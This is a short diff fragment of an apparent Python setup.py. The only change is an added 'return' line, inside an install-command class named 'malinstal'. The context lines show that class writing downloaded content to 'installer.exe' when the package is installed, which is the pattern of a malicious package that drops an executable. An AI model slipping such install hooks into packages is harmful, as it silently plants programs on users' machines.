@@ -36,6 +36,7 @@ class malinstal(install):
             with open('installer.exe', 'wb') as f:
                 f.write(installer_content)
             print('Installer downloaded to current directory')
+            return
 
 setup(
     name=NAME,
